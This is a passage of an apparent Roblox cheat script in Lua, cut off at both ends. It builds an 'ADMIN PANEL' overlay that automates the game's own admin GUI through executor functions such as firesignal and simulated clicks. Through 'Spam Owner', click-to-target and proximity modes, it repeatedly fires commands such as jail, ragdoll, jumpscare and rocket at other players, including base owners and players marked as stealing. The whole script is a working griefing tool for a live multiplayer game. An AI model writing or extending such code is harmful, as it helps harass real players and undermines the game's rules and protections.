    local avatarFrame = Instance.new("ImageLabel", sidebar)
    avatarFrame.Size = UDim2.new(0, 56, 0, 56)
    avatarFrame.Position = UDim2.new(0.5, -28, 0, 8)
    avatarFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
    avatarFrame.BorderSizePixel = 0
    Instance.new("UICorner", avatarFrame).CornerRadius = UDim.new(0, 8)
    pcall(function() avatarFrame.Image = "rbxthumb://type=Asset&id=104691346948495&w=150&h=150" end)

    local function makeSideToggle(parent, yPos, label, isOn)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.new(1, -12, 0, 28)
        btn.Position = UDim2.new(0, 6, 0, yPos)
        btn.BackgroundColor3 = isOn and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22, 22, 30)
        btn.BackgroundTransparency = 0.15
        btn.Text = label; btn.Font = Enum.Font.GothamBold; btn.TextSize = 9
        btn.TextColor3 = isOn and Color3.new(0,0,0) or Color3.fromRGB(160, 162, 180)
        btn.BorderSizePixel = 0; btn.AutoButtonColor = false
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
        return btn
    end

    local sideProxBtn = makeSideToggle(sidebar, 72, "Prox", ProximityAPActive)
    local sideCtapBtn = makeSideToggle(sidebar, 104, "Click AP", Config.ClickToAP or false)
    local sideSpamBtn = makeSideToggle(sidebar, 136, "Spam", false)

    -- Range slider no rodapé da sidebar
    -- Range slider no RODAPÉ centralizado (abaixo da lista)
    local rangeLabel = Instance.new("TextLabel", frame)
    rangeLabel.Size = UDim2.new(1, -100, 0, 14)
    rangeLabel.Position = UDim2.new(0, 92, 1, -32)
    rangeLabel.BackgroundTransparency = 1
    rangeLabel.Text = "Range: " .. math.floor(Config.ProximityRange or 15)
    rangeLabel.Font = Enum.Font.GothamBold
    rangeLabel.TextSize = 10
    rangeLabel.TextColor3 = Color3.fromRGB(130, 132, 155)
    rangeLabel.TextXAlignment = Enum.TextXAlignment.Center

    local sideSliderBg = Instance.new("Frame", frame)
    sideSliderBg.Size = UDim2.new(1, -108, 0, 5)
    sideSliderBg.Position = UDim2.new(0, 92, 1, -14)
    sideSliderBg.AnchorPoint = Vector2.new(0, 0)
    sideSliderBg.BackgroundColor3 = Color3.fromRGB(30, 32, 38)
    Instance.new("UICorner", sideSliderBg).CornerRadius = UDim.new(1, 0)
    local sideFill = Instance.new("Frame", sideSliderBg)
    sideFill.BackgroundColor3 = Color3.fromRGB(80, 140, 255); sideFill.Size = UDim2.new(0,0,1,0)
    Instance.new("UICorner", sideFill).CornerRadius = UDim.new(1, 0)
    local sideKnob = Instance.new("Frame", sideSliderBg)
    sideKnob.Size = UDim2.new(0,10,0,10); sideKnob.BackgroundColor3 = Color3.fromRGB(185,188,215)
    sideKnob.AnchorPoint = Vector2.new(0.5, 0.5); sideKnob.Position = UDim2.new(0, 0, 0.5, 0)
    Instance.new("UICorner", sideKnob).CornerRadius = UDim.new(1,0)

    local function updateSideSlider(val)
        val = math.clamp(val, 5, 50)
        Config.ProximityRange = val; SaveConfig()
        local pct = (val - 5) / 45
        sideFill.Size = UDim2.new(pct, 0, 1, 0)
        sideKnob.Position = UDim2.new(pct, 0, 0.5, 0)
        rangeLabel.Text = "Range: " .. math.floor(val)
    end
    local initPct = ((Config.ProximityRange or 15) - 5) / 45
    sideFill.Size = UDim2.new(initPct, 0, 1, 0)
    sideKnob.Position = UDim2.new(initPct, 0, 0.5, 0)

    local sDrag = false
    sideSliderBg.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then sDrag = true end end)
    sideSliderBg.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then sDrag = false end end)
    game:GetService("UserInputService").InputChanged:Connect(function(i)
        if sDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local r = sideSliderBg.AbsolutePosition.X
            local w = sideSliderBg.AbsoluteSize.X
            local pct = math.clamp((i.Position.X - r) / w, 0, 1)
            updateSideSlider(5 + pct * 45)
        end
    end)

    local header = Instance.new("Frame", frame)

    header.Size = UDim2.new(1, 0, 0, 42)

    header.BackgroundTransparency = 1

    MakeDraggable(header, frame, "AdminPanel")

    local title = Instance.new("TextLabel", header)

    title.Size = UDim2.new(1, -100, 1, 0)

    title.Position = UDim2.new(0, 92, 0, 0)

    title.BackgroundTransparency = 1

    title.Text = "ADMIN PANEL"

    title.Font = Enum.Font.GothamBlack

    title.TextSize = 14

    title.TextColor3 = Color3.fromRGB(210,212,225)

    title.TextXAlignment = Enum.TextXAlignment.Left

    -- proxCont oculto (mantém variáveis para handlers internos)
    local proxCont = Instance.new("Frame", frame)

    proxCont.Size = UDim2.new(0, 0, 0, 0)

    proxCont.Position = UDim2.new(0, 0, 0, 0)

    proxCont.Visible = false

    proxCont.BackgroundColor3 = Color3.fromRGB(16,16,20)

    proxCont.BackgroundTransparency = 0.25

    Instance.new("UICorner", proxCont).CornerRadius = UDim.new(0, 7)

    local proxBtn = Instance.new("TextButton", proxCont)

    proxBtn.Name = "ProximityAPButton"

    proxBtn.Size = UDim2.new(0, 70, 0, 26)

    proxBtn.Position = UDim2.new(0, 6, 0.5, -13)

    proxBtn.BackgroundColor3 = ProximityAPActive and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(35, 37, 43)

    proxBtn.Text = "Prox"

    proxBtn.Font = Enum.Font.GothamBold; proxBtn.TextSize = 11

    proxBtn.TextColor3 = ProximityAPActive and Color3.new(255,255,255) or Color3.fromRGB(185,188,215)

    Instance.new("UICorner", proxBtn).CornerRadius = UDim.new(0, 6)

    SharedState.ProximityAPButton = proxBtn

    SharedState.ProximityAPButtonStroke = proxBtnStroke

    SharedState.AdminProxBtn = proxBtn

    local spamBaseBtn = Instance.new("TextButton", proxCont)

    spamBaseBtn.Size = UDim2.new(0, 70, 0, 26)

    spamBaseBtn.Position = UDim2.new(0, 80, 0.5, -13)

    spamBaseBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 43)

    spamBaseBtn.Text = "Spam Owner"

    spamBaseBtn.Font = Enum.Font.GothamBold; spamBaseBtn.TextSize = 9

    spamBaseBtn.TextColor3 = Color3.fromRGB(185,188,215)

    Instance.new("UICorner", spamBaseBtn).CornerRadius = UDim.new(0, 6)

    -- Click-to-AP button in the admin panel bar (auto-enables SingleCommand mode)

    local ctapPanelBtn = Instance.new("TextButton", proxCont)

    ctapPanelBtn.Size = UDim2.new(0, 60, 0, 26)

    ctapPanelBtn.Position = UDim2.new(0, 154, 0.5, -13)

    ctapPanelBtn.AutoButtonColor = false

    ctapPanelBtn.Text = "Click AP"

    ctapPanelBtn.Font = Enum.Font.GothamBold

    ctapPanelBtn.TextSize = 9

    ctapPanelBtn.BorderSizePixel = 0

    local function updateCtapPanelBtn()

        ctapPanelBtn.BackgroundColor3 = Config.ClickToAP and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(35, 37, 43)

        ctapPanelBtn.TextColor3 = Config.ClickToAP and Color3.new(0,0,0) or Color3.fromRGB(185,188,215)

    end

    updateCtapPanelBtn()

    Instance.new("UICorner", ctapPanelBtn).CornerRadius = UDim.new(0, 6)

    ctapPanelBtn.MouseButton1Click:Connect(function()

        Config.ClickToAP = not Config.ClickToAP

        -- When enabling from the panel, always force single-command mode

        if Config.ClickToAP then

            Config.ClickToAPSingleCommand = true

        end

        SaveConfig()

        updateCtapPanelBtn()

        ShowNotification("CLICK TO AP", Config.ClickToAP and "ON (single cmd)" or "DISABLED")

    end)

    

    local function runSpamOwner()

        local char = LocalPlayer.Character

        local hrp = char and char:FindFirstChild("HumanoidRootPart")

        if not hrp then

            ShowNotification("SPAM OWNER", "No character found")

            return

        end

        

        local nearestPlot = nil

        local nearestDist = math.huge

        local Plots = Workspace:FindFirstChild("Plots")

        if Plots then

            for _, plot in ipairs(Plots:GetChildren()) do

                local sign = plot:FindFirstChild("PlotSign")

                if sign then

                    local yourBase = sign:FindFirstChild("YourBase")

                    if not yourBase or not yourBase.Enabled then

                        local signPos = sign:IsA("BasePart") and sign.Position or (sign.PrimaryPart and sign.PrimaryPart.Position)

                        if not signPos then

                            local part = sign:FindFirstChildWhichIsA("BasePart", true)

                            signPos = part and part.Position

                        end

                        if signPos then

                            local dist = (hrp.Position - signPos).Magnitude

                            if dist < nearestDist then

                                nearestDist = dist

                                nearestPlot = plot

                            end

                        end

                    end

                end

            end

        end

        

        if not nearestPlot then

            ShowNotification("SPAM OWNER", "No nearby base found")

            return

        end

        

        

        local targetPlayer = nil

        local ok, ch = pcall(function() local S = adminGetSync(); return S and S:Get(nearestPlot.Name) end)

        if ok and ch then

            local owner = ch:Get("Owner")

            if owner then

                if typeof(owner) == "Instance" and owner:IsA("Player") then

                    targetPlayer = owner

                elseif type(owner) == "table" and owner.Name then

                    targetPlayer = Players:FindFirstChild(owner.Name)

                end

            end

        end

        

        

        if not targetPlayer then

            local sign = nearestPlot:FindFirstChild("PlotSign")

            local textLabel = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") and sign.SurfaceGui.Frame:FindFirstChild("TextLabel")

            if textLabel then

                local baseText = textLabel.Text

                local nickname = baseText and baseText:match("^(.-)'") or baseText

                if nickname then

                    for _, p in ipairs(Players:GetPlayers()) do

                        if p.DisplayName == nickname or p.Name == nickname then

                            targetPlayer = p

                            break

                        end

                    end

                end

            end

        end

        

        if not targetPlayer or targetPlayer == LocalPlayer then

            ShowNotification("SPAM OWNER", "Owner not found or is you")

            return

        end

        

        spamBaseBtn.BackgroundColor3 = Color3.fromRGB(14,14,20)

        spamBaseBtn.TextColor3 = Color3.new(1,1,1)

        ShowNotification("SPAM OWNER", "Spamming " .. targetPlayer.DisplayName)

        

        task.spawn(function()

            local cmds = {"balloon", "inverse", "jail", "jumpscare", "morph", "nightvision", "ragdoll", "rocket", "tiny"}

            local cmdCount = 0

            

            local adminFunc = _G.runAdminCommand

            if not adminFunc then

                task.wait(0.05)

                adminFunc = _G.runAdminCommand

            end

            

            if not adminFunc then

                spamBaseBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 43)

                spamBaseBtn.TextColor3 = Color3.fromRGB(185,188,215)

                ShowNotification("SPAM OWNER", "Admin command not ready")

                return

            end

            

            for _, cmd in ipairs(cmds) do

                local success, result = pcall(function()

                    return adminFunc(targetPlayer, cmd)

                end)

                if success and result then

                    cmdCount = cmdCount + 1

                end

                task.wait(0.15)

            end

            

            task.wait(0.2)

            spamBaseBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 43)

            spamBaseBtn.TextColor3 = Color3.fromRGB(185,188,215)

            ShowNotification("SPAM OWNER", "Sent " .. cmdCount .. " commands to " .. targetPlayer.DisplayName)

        end)

    end

    spamBaseBtn.MouseButton1Click:Connect(runSpamOwner)

    local proxSliderBg = Instance.new("Frame", proxCont)

    proxSliderBg.Size = UDim2.new(0, 140, 0, 5)

    proxSliderBg.Position = UDim2.new(0, 105, 0.5, -2.5)

    proxSliderBg.BackgroundColor3 = Color3.fromRGB(30, 32, 38)

    Instance.new("UICorner", proxSliderBg).CornerRadius = UDim.new(1,0)

    local proxFill = Instance.new("Frame", proxSliderBg)

    proxFill.BackgroundColor3 = Color3.fromRGB(14,14,20); proxFill.Size = UDim2.new(0,0,1,0)

    Instance.new("UICorner", proxFill).CornerRadius = UDim.new(1,0)

    local proxKnob = Instance.new("Frame", proxSliderBg)

    proxKnob.Size = UDim2.new(0,12,0,12); proxKnob.BackgroundColor3 = Color3.fromRGB(185,188,215)

    proxKnob.AnchorPoint = Vector2.new(0.5, 0.5); proxKnob.Position = UDim2.new(0,0,0.5,0)

    Instance.new("UICorner", proxKnob).CornerRadius = UDim.new(1,0)

    local function updateProxSlider(val)

        local min, max = 5, 50

        val = math.clamp(val, min, max)

        Config.ProximityRange = val; SaveConfig()

        local pct = (val - min)/(max - min)

        proxFill.Size = UDim2.new(pct, 0, 1, 0)

        proxKnob.Position = UDim2.new(pct, 0, 0.5, 0)

        ShowNotification("PROXIMITY RANGE", string.format("%.1f", val) .. " studs")

    end

    updateProxSlider(Config.ProximityRange)

    local pDragging = false

    proxSliderBg.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDragging=true end end)

    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDragging=false end end)

    UserInputService.InputChanged:Connect(function(i)

        if pDragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then

            local x = i.Position.X

            local r = proxSliderBg.AbsolutePosition.X

            local w = proxSliderBg.AbsoluteSize.X

            local p = (x - r) / w

            updateProxSlider(5 + (p * 45))

        end

    end)

    local proxViz = nil

    local function updateProxViz()

        if ProximityAPActive then 

            if not proxViz then

                proxViz = Instance.new("Part")

                proxViz.Name = "XiProxViz"

                proxViz.Anchored = true; proxViz.CanCollide = false

                proxViz.Shape = Enum.PartType.Cylinder

                proxViz.Color = Color3.fromRGB(80, 140, 255); proxViz.Transparency = 0.6

                proxViz.CastShadow = false

                proxViz.Parent = Workspace

            end

            local char = LocalPlayer.Character

            if char and char:FindFirstChild("HumanoidRootPart") then

                local hrp = char.HumanoidRootPart

                proxViz.Size = Vector3.new(0.5, Config.ProximityRange * 2, Config.ProximityRange * 2)

                proxViz.CFrame = hrp.CFrame * CFrame.Angles(0,0,math.rad(90)) + Vector3.new(0, -2.5, 0)

            end

        else

            if proxViz then proxViz:Destroy(); proxViz = nil end

        end

    end

    do

        local _pvT = 0

        RunService.Heartbeat:Connect(function(dt)

            _pvT += dt

            if _pvT < 0.05 then return end

            _pvT = 0

            updateProxViz()

        end)

    end

    local function updateProximityAPButton()

        if SharedState.ProximityAPButton then

            SharedState.ProximityAPButton.BackgroundColor3 = ProximityAPActive and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(35, 37, 43)

            SharedState.ProximityAPButton.TextColor3 = ProximityAPActive and Color3.new(255,255,255) or Color3.fromRGB(185,188,215)

            if SharedState.ProximityAPButtonStroke then

                SharedState.ProximityAPButtonStroke.Color = ProximityAPActive and Color3.fromRGB(90,140,255) or Color3.fromRGB(50, 52, 58)

            end

        end

    end

    

    proxBtn.MouseButton1Click:Connect(function()

        ProximityAPActive = not ProximityAPActive 

        updateProximityAPButton()

        ShowNotification("PROXIMITY AP", ProximityAPActive and "ENABLED" or "DISABLED")

    end)

    -- Sidebar button handlers
    sideProxBtn.MouseButton1Click:Connect(function()
        ProximityAPActive = not ProximityAPActive
        updateProximityAPButton()
        sideProxBtn.BackgroundColor3 = ProximityAPActive and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22, 22, 30)
        sideProxBtn.TextColor3 = ProximityAPActive and Color3.new(0,0,0) or Color3.fromRGB(160, 162, 180)
    end)
    sideCtapBtn.MouseButton1Click:Connect(function()
        Config.ClickToAP = not Config.ClickToAP
        if Config.ClickToAP then Config.ClickToAPSingleCommand = true end
        SaveConfig()
        sideCtapBtn.BackgroundColor3 = Config.ClickToAP and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22, 22, 30)
        sideCtapBtn.TextColor3 = Config.ClickToAP and Color3.new(0,0,0) or Color3.fromRGB(160, 162, 180)
    end)
    sideSpamBtn.MouseButton1Click:Connect(runSpamOwner)

    proxSliderBg.Position = UDim2.new(0, 220, 0.5, -2.5)

    listFrame = Instance.new("ScrollingFrame", frame)

    listFrame.Size = UDim2.new(1, -100, 1, -80)

    listFrame.Position = UDim2.new(0, 92, 0, 46)

    listFrame.BackgroundTransparency = 1

    listFrame.BorderSizePixel = 0

    listFrame.ScrollBarThickness = 0

    listFrame.ScrollBarImageColor3 = Color3.fromRGB(100,155,255)

    layout = Instance.new("UIListLayout", listFrame)

    layout.Padding = UDim.new(0, 10)

    layout.SortOrder = Enum.SortOrder.LayoutOrder

    local function getAdminPanelSortKey(plr)

        if not plr or not plr.Parent then return 3, 9999, "" end

        local stealing = plr:GetAttribute("Stealing")

        local brainrotName = plr:GetAttribute("StealingIndex")

        if not stealing then

            return 3, 9999, plr.Name or ""

        end

        if brainrotName then

            for i, pName in ipairs(PRIORITY_LIST) do

                if pName == brainrotName then

                    return 1, i, plr.Name or ""

                end

            end

            return 2, 9999, plr.Name or ""

        end

        return 2, 9999, plr.Name or ""

    end

    local function sortAdminPanelList()

        local rows = {}

        for _, child in ipairs(listFrame:GetChildren()) do

            if child:IsA("TextButton") and child.Name ~= "" then

                local plr = Players:FindFirstChild(child.Name)

                if plr then

                    table.insert(rows, {row = child, plr = plr})

                end

            end

        end

        table.sort(rows, function(a, b)

            local t1, p1, n1 = getAdminPanelSortKey(a.plr)

            local t2, p2, n2 = getAdminPanelSortKey(b.plr)

            if t1 ~= t2 then return t1 < t2 end

            if p1 ~= p2 then return p1 < p2 end

            return (n1 or "") < (n2 or "")

        end)

        for i, entry in ipairs(rows) do

            entry.row.LayoutOrder = i

        end

    end

    local function fireClick(button)

        if button then

            if firesignal then

                firesignal(button.MouseButton1Click); firesignal(button.MouseButton1Down); firesignal(button.Activated)

            else

                local x = button.AbsolutePosition.X + (button.AbsoluteSize.X / 2)

                local y = button.AbsolutePosition.Y + (button.AbsoluteSize.Y / 2) + 58

                VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)

                VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)

            end

        end

    end

    _G.fireClick = fireClick

    local function runAdminCommand(targetPlayer, commandName)

        if targetPlayer and isBlacklisted(targetPlayer.Name) then return false end

        local realAdminGui = PlayerGui:WaitForChild("AdminPanel", 5)

        if not realAdminGui then return false end

        local contentScroll = realAdminGui.AdminPanel:WaitForChild("Content"):WaitForChild("ScrollingFrame")

        local cmdBtn = contentScroll:FindFirstChild(commandName)

        if not cmdBtn then return false end

        fireClick(cmdBtn)

        task.wait(0.05)

        local profilesScroll = realAdminGui:WaitForChild("AdminPanel"):WaitForChild("Profiles"):WaitForChild("ScrollingFrame")

        local playerBtn = profilesScroll:FindFirstChild(targetPlayer.Name)

        if not playerBtn then return false end

        fireClick(playerBtn)

        return true

    end

    

    _G.runAdminCommand = runAdminCommand

local isOnCooldown

local function getNextAvailableCommand()

    local priorityCommands = {"ragdoll", "balloon", "rocket", "jail"}

    local otherCommands = {}

    

    for _, cmd in ipairs(ALL_COMMANDS) do

        local isPriority = false

        for _, priorityCmd in ipairs(priorityCommands) do

            if cmd == priorityCmd then

                isPriority = true

                break

            end

        end

        if not isPriority then

            table.insert(otherCommands, cmd)

        end

    end

    for _, cmd in ipairs(priorityCommands) do

        if not isOnCooldown(cmd) then

            return cmd

        end

    end

    for _, cmd in ipairs(otherCommands) do

        if not isOnCooldown(cmd) then

            return cmd

        end

    end

    return nil

end

isOnCooldown = function(cmd)

    local adminGui = PlayerGui:FindFirstChild("AdminPanel")

    if adminGui then

        local content = adminGui:FindFirstChild("AdminPanel")

        if content then

            local scrollFrame = content:FindFirstChild("Content")

            if scrollFrame then

                local scrollingFrame = scrollFrame:FindFirstChild("ScrollingFrame")

                if scrollingFrame then

                    local cmdButton = scrollingFrame:FindFirstChild(cmd)

                    if cmdButton then

                        local timerLabel = cmdButton:FindFirstChild("Timer")

                        if timerLabel then

                            return timerLabel.Visible

                        end

                    end

                end

            end

        end

    end

    

    if not activeCooldowns[cmd] then return false end

    return (tick() - activeCooldowns[cmd]) < (COOLDOWNS[cmd] or 0)

end

    local function setGlobalVisualCooldown(cmd)

        if SharedState.AdminButtonCache[cmd] then

            for _, b in ipairs(SharedState.AdminButtonCache[cmd]) do

                if b and b.Parent then

                    b.BackgroundColor3 = Color3.fromRGB(200,60,60)

                    task.delay(COOLDOWNS[cmd] or 5, function()

                        if b and b.Parent then

                            local hasBallooned = (cmd == "balloon" and SharedState.BalloonedPlayers and next(SharedState.BalloonedPlayers) ~= nil)

                            b.BackgroundColor3 = hasBallooned and Color3.fromRGB(200,60,60) or Color3.fromRGB(22,22,35)

                        end

                    end)

                end

            end

        end

    end

    local function updateBalloonButtons()

        local hasBallooned = false

        for _, _ in pairs(SharedState.BalloonedPlayers) do

            hasBallooned = true

            break

        end

        if SharedState.AdminButtonCache and SharedState.AdminButtonCache["balloon"] then

            for _, b in ipairs(SharedState.AdminButtonCache["balloon"]) do

                if b and b.Parent then

                    b.BackgroundColor3 = hasBallooned and Color3.fromRGB(200,60,60) or Color3.fromRGB(22,22,35)

                end

            end

        end

    end

    local function triggerAll(plr)

        if not canUseAdminAction(plr) then return end

        local count = 0

        for _, cmd in ipairs(ALL_COMMANDS) do

            if not isOnCooldown(cmd) then

                task.delay(count * 0.1, function()

                    if runAdminCommand(plr, cmd) then

                        activeCooldowns[cmd] = tick()

                        setGlobalVisualCooldown(cmd)

                        if cmd == "balloon" then

                            SharedState.BalloonedPlayers[plr.UserId] = true

                            updateBalloonButtons()

                        end

                    end

                end)

                count = count + 1

            end

        end

    end

    local function rayToCubeIntersect(rayOrigin, rayDirection, cubeCenter, cubeSize)

        local halfSize = cubeSize / 2

        local minBounds = cubeCenter - Vector3.new(halfSize, halfSize, halfSize)

        local maxBounds = cubeCenter + Vector3.new(halfSize, halfSize, halfSize)

        

        if rayDirection.X == 0 then rayDirection = Vector3.new(0.0001, rayDirection.Y, rayDirection.Z) end

        if rayDirection.Y == 0 then rayDirection = Vector3.new(rayDirection.X, 0.0001, rayDirection.Z) end

        if rayDirection.Z == 0 then rayDirection = Vector3.new(rayDirection.X, rayDirection.Y, 0.0001) end

        

        local tmin = (minBounds.X - rayOrigin.X) / rayDirection.X

        local tmax = (maxBounds.X - rayOrigin.X) / rayDirection.X

        if tmin > tmax then tmin, tmax = tmax, tmin end

        

        local tymin = (minBounds.Y - rayOrigin.Y) / rayDirection.Y

        local tymax = (maxBounds.Y - rayOrigin.Y) / rayDirection.Y

        if tymin > tymax then tymin, tymax = tymax, tymin end

        

        if tmin > tymax or tymin > tmax then return false end

        if tymin > tmin then tmin = tymin end

        if tymax < tmax then tmax = tymax end

        

        local tzmin = (minBounds.Z - rayOrigin.Z) / rayDirection.Z

        local tzmax = (maxBounds.Z - rayOrigin.Z) / rayDirection.Z

        if tzmin > tzmax then tzmin, tzmax = tzmax, tzmin end

        

        if tmin > tzmax or tzmin > tmax then return false end

        

        return true

    end

    local _hlParent = PlayerGui

    pcall(function() _hlParent = game:GetService("CoreGui") end)

    local highlight = Instance.new("Highlight", _hlParent)

   highlight.FillColor = Color3.fromRGB(255, 50, 50)

    highlight.FillTransparency = 0.3

    highlight.OutlineColor = Color3.fromRGB(255, 50, 50)

    highlight.OutlineTransparency = 0

    highlight.Adornee = nil

    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

    local _clickAPFrame = 0
    RunService.RenderStepped:Connect(function()
        if not Config.ClickToAP then highlight.Adornee = nil; return end
        _clickAPFrame = _clickAPFrame + 1
        if _clickAPFrame % 2 ~= 0 then return end

        if Config.ClickToAP then

            local camera = Workspace.CurrentCamera

            local mousePos = UserInputService:GetMouseLocation()

            local ray = camera:ViewportPointToRay(mousePos.X, mousePos.Y)

            

            local hitboxSize = 8

            local bestPlayer = nil

            local bestDistance = math.huge

            

            for _, p in ipairs(Players:GetPlayers()) do

                if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Parent then

                    local hrp = p.Character.HumanoidRootPart

                    local cubeCenter = hrp.Position

                    

                    if rayToCubeIntersect(ray.Origin, ray.Direction, cubeCenter, hitboxSize) then

                        local distance = (ray.Origin - cubeCenter).Magnitude

                        if distance < bestDistance then

                            bestDistance = distance

                            bestPlayer = p

                        end

                    end

                end

            end

            

            local newAdornee = bestPlayer and bestPlayer.Character or nil

            if highlight.Adornee ~= newAdornee then

                highlight.Adornee = newAdornee

        for _, child in ipairs(listFrame:GetChildren()) do

            if child:IsA("TextButton") then

                local stroke = child:FindFirstChildOfClass("UIStroke")

                if stroke then

                    local hoveredName = newAdornee and newAdornee.Parent and Players:GetPlayerFromCharacter(newAdornee.Parent) and Players:GetPlayerFromCharacter(newAdornee.Parent).Name or ""

                    if newAdornee and child.Name == hoveredName then

                        stroke.Color = Color3.fromRGB(255, 50, 50)

                        stroke.Transparency = 0

                        child.BackgroundColor3 = Color3.fromRGB(60, 20, 20)

                    else

                        stroke.Color = Color3.fromRGB(90,140,255)

                        stroke.Transparency = 0.7

                        child.BackgroundColor3 = Color3.fromRGB(32, 32, 32)

                    end

                end

            end

        end            end

        else

            highlight.Adornee = nil

        end

    end)

    UserInputService.InputBegan:Connect(function(inp, g)

        if not g and inp.UserInputType == Enum.UserInputType.MouseButton1 and Config.ClickToAP then

            local camera = Workspace.CurrentCamera

            local mousePos = UserInputService:GetMouseLocation()

            local ray = camera:ViewportPointToRay(mousePos.X, mousePos.Y)

            

            local hitboxSize = 8

            local bestPlayer = nil

            local bestDistance = math.huge

            

            for _, p in ipairs(Players:GetPlayers()) do

                if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Parent then

                    local hrp = p.Character.HumanoidRootPart

                    local cubeCenter = hrp.Position

                    

                    if rayToCubeIntersect(ray.Origin, ray.Direction, cubeCenter, hitboxSize) then

                        local distance = (ray.Origin - cubeCenter).Magnitude

                        if distance < bestDistance then

                            bestDistance = distance

                            bestPlayer = p

                        end

                    end

                end

            end

            

            if bestPlayer then

                if isBlacklisted(bestPlayer.Name) then

                    ShowNotification("CLICK TO AP", bestPlayer.Name .. " is blacklisted")

                    return

                end

                

                local hasAnyAvailable = false

                for _, cmd in ipairs(ALL_COMMANDS) do

                    if not isOnCooldown(cmd) then

                        hasAnyAvailable = true

                        break

                    end

                end

                if hasAnyAvailable then

                    if Config.ClickToAPSingleCommand then

                        local nextCmd = getNextAvailableCommand()

                        if nextCmd then

                            if runAdminCommand(bestPlayer, nextCmd) then

                                activeCooldowns[nextCmd] = tick()

                                setGlobalVisualCooldown(nextCmd)

                                if nextCmd == "balloon" then

                                    SharedState.BalloonedPlayers[bestPlayer.UserId] = true

                                    updateBalloonButtons()

                                end

                                ShowNotification("CLICK AP", "Sent " .. nextCmd .. " to " .. bestPlayer.Name)

                            else

                                ShowNotification("CLICK AP", "Failed to send " .. nextCmd .. " to " .. bestPlayer.Name)

                            end

                        else

                            ShowNotification("CLICK AP", "All commands on cooldown")

                        end

                    else

                        triggerAll(bestPlayer)

                        ShowNotification("CLICK AP", "Triggered on " .. bestPlayer.Name)

                    end

                else

                    local realAdminGui = PlayerGui:WaitForChild("AdminPanel", 5)

                    if realAdminGui then

                        local profilesScroll = realAdminGui:WaitForChild("AdminPanel"):WaitForChild("Profiles"):WaitForChild("ScrollingFrame")

                        local playerBtn = profilesScroll:FindFirstChild(bestPlayer.Name)

                        if playerBtn then

                            fireClick(playerBtn)

                            ShowNotification("CLICK AP", "Selected " .. bestPlayer.Name)

                        end

                    end

                end

            end

        end

    end)

    task.spawn(function()

        while true do

            task.wait(0.2)

            if ProximityAPActive then

                local myChar = LocalPlayer.Character

                if myChar and myChar:FindFirstChild("HumanoidRootPart") then

                    for _, p in ipairs(Players:GetPlayers()) do

                        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then

                            local dist = (p.Character.HumanoidRootPart.Position - myChar.HumanoidRootPart.Position).Magnitude

                            if dist <= Config.ProximityRange then

                                if isBlacklisted(p.Name) then

                                    -- skip proximity AP 

                                else

                                    local hasAnyAvailable = false

                                    for _, cmd in ipairs(ALL_COMMANDS) do

                                        if not isOnCooldown(cmd) then

                                            hasAnyAvailable = true

                                            break

                                        end

                                    end

                                    if hasAnyAvailable then

                                        triggerAll(p)

                                    end

                                end

                            end

                        end

                    end

                end

            end

        end

    end)

    local function createPlayerRow(plr)
        -- Row container (auto-height to fit 2-line or 3-line info)
        local ROW_H_NORMAL   = 44
        local ROW_H_STEALING = 54
        local BTN_W = 24

        local row = Instance.new("TextButton", listFrame)
        row.Name = plr.Name
        row.Size = UDim2.new(1, 0, 0, ROW_H_NORMAL)
        row.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
        row.BackgroundTransparency = 0.15
        row.BorderSizePixel = 0
        row.AutoButtonColor = false
        row.Text = ""
        row.ZIndex = 2
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 9)
        local rowStroke = Instance.new("UIStroke", row)
        rowStroke.Color = Color3.fromRGB(35, 37, 43)
        rowStroke.Thickness = 1
        rowStroke.Transparency = 0.65

        -- ── Avatar ────────────────────────────────────────────────────────
        local avatar = Instance.new("ImageLabel", row)
        avatar.Size = UDim2.new(0, 32, 0, 32)
        avatar.Position = UDim2.new(0, 7, 0.5, -16)
        avatar.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
        avatar.BorderSizePixel = 0
        avatar.ZIndex = 3
        Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
        local avatarStroke = Instance.new("UIStroke", avatar)
        avatarStroke.Color = Color3.fromRGB(80, 140, 255)
        avatarStroke.Thickness = 1.5
        avatarStroke.Transparency = 0.55
        pcall(function()
            avatar.Image = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
        end)

        -- ── Name + @username + stealing badge ─────────────────────────────
        local infoFrame = Instance.new("Frame", row)
        infoFrame.Size = UDim2.new(1, -46, 1, 0)  -- recalculated below after btnCont
        infoFrame.Position = UDim2.new(0, 45, 0, 0)
        infoFrame.BackgroundTransparency = 1
        infoFrame.ZIndex = 3

        local dName = Instance.new("TextLabel", infoFrame)
